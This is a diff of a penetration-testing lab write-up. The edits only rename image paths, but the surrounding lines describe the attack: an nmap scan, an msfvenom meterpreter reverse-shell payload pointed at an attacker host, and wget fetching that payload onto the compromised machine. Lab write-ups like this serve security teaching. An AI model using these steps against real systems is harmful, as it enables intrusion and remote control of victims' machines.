@@ -27,7 +27,7 @@ The best tools for this lab are:
 
 Pinging the website [http://online-calc.com/](http://online-calc.com) gives us an IP of 192.9.232.3
 
-![](<../../../../.gitbook/assets/image (11) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (11) (1) (1) (1).png>)
 
 We'll run an nmap scan against the target
 
@@ -37,7 +37,7 @@ nmap -sC -sV -O -p1-10000 online-calc.com
 
 There is an Apache 2.4.29 HTTP server running on Port 80
 
-![](<../../../../.gitbook/assets/image (3) (1).png>)
+![](<../../../../.gitbook/assets/image (3) (1) (2).png>)
 
 Some strange unrecognizable service is running on Port 5000, but it must be a webapp due to the HTTP content printed
 
@@ -254,7 +254,7 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.250.81.2 LPORT=9999 -f e
 
 We'll start an http server on our host and use wget on the compromised host to download the payload and then start a listener with Metasploit
 
-![Used python to host our directory containing the payload](<../../../../.gitbook/assets/image (10) (1).png>)
+![Used python to host our directory containing the payload](<../../../../.gitbook/assets/image (10) (1) (2).png>)
 
 ![Used wget to download the payload onto the compromised machine](<../../../../.gitbook/assets/image (45) (1) (1).png>)
 
